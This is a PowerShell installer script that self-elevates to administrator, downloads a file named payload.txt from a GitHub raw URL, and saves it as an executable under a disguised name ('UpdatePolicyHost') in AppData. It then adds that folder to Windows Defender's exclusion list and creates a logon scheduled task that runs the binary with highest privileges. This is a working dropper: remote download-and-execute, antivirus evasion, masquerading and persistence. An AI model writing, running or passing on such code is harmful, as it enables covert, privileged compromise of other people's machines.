If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
{
    Start-Process powershell "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

$dummy_name_no_exe = "UpdatePolicyHost"
$hidden_path = $env:APPDATA + "\$dummy_name_no_exe"
$dummy_name = "$dummy_name_no_exe.exe"

Remove-MpPreference -ExclusionPath "$hidden_path" 2>$null
schtasks /end /tn "$dummy_name_no_exe" 2>$null
Stop-Process -Name "$dummy_name_no_exe" -Force 2>$null
schtasks /delete /tn "$dummy_name_no_exe" /f 2>$null
Remove-Item "$hidden_path" -Recurse -Force -Confirm:$false 2>$null

if (!(Test-Path "$hidden_path")){
    mkdir "$hidden_path"
}

Invoke-WebRequest -Uri "https://raw.githubusercontent.com/PowerPizza/Wireless-ALT-F4-public/master/payload.txt" -OutFile "$env:USERPROFILE\payload.txt"

if ((Get-MpPreference).ExclusionPath -contains "$hidden_path") {
    Remove-MpPreference -ExclusionPath "$hidden_path"
}
Add-MpPreference -ExclusionPath "$hidden_path"

Copy-Item "$env:USERPROFILE\payload.txt" -Destination "$hidden_path\$dummy_name"
schtasks /create /tn "$dummy_name_no_exe" /tr "$hidden_path\$dummy_name" /sc onlogon /rl HIGHEST /f
Remove-Item "$env:USERPROFILE\payload.txt"
schtasks /run /tn "$dummy_name_no_exe"

pause